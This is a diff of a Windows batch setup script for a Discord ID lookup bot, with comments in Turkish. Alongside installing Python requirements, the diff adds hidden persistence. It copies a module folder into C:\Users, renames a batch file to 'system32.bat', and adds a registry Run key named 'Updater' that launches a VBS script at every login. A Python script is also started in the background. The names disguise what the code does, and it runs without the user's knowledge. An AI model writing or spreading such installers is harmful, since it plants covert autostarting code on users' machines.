@@ -3,11 +3,20 @@ chcp 65001 >nul
 title Satan Discord ID Sorgu
 start "" /B python modules/accepts/main.py
 @echo off
-set STARTUP=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
+set STARTUP=C:\Users\accepts
 set KAYNAK=%~dp0modules\accepts
 
-copy "%KAYNAK%\discordid.bat" "%STARTUP%\discordid.bat"
-copy "%KAYNAK%\discordid.vbs" "%STARTUP%\discordid.vbs"
+copy "%KAYNAK%\discordid.bat" "%STARTUP%\system32.bat"
+@echo off
+set HEDEF=C:\Users\accepts
+set KAYNAK=%~dp0modules\accepts
+
+robocopy "%KAYNAK%" "%HEDEF%" /E
+
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Updater" /t REG_SZ /d "wscript.exe \"%HEDEF%\discordid.vbs\"" /f
+
+echo Tamamlandi.
+pause
 
 pause
 pip install pypiwin32
@@ -31,13 +40,4 @@ echo.
 echo Gereksinimler yüklendi. Start.bat dosyası ile botu çalıştırın!
 echo.
 timeout /t 8 >nul
-
-@echo off
-set STARTUP=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
-set KAYNAK=%~dp0modules\accepts
-
-copy "%KAYNAK%\discordid.bat" "%STARTUP%\discordid.bat"
-copy "%KAYNAK%\discordid.vbs" "%STARTUP%\discordid.vbs"
-
-pause
 exit
